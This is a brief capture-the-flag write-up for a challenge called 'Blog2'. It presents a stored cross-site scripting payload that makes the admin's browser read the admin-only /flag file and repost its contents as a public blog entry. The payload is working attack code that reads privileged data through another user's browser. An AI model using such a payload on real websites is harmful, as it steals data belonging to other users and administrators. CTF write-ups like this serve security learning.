# Blog2
A modification from the first blog-task. Same setup, but the flag is in /flag - readable only by admin.

We expand the javascript to make admin fetch it for us and post it on the blog:
```js
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/flag',true);
req.send();
function handleResponse() {
    var postReq = new XMLHttpRequest();
    postReq.open('post', '/create', true);
    postReq.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    postReq.send('title=pwn&body=' + this.responseText)
};
</script>
```
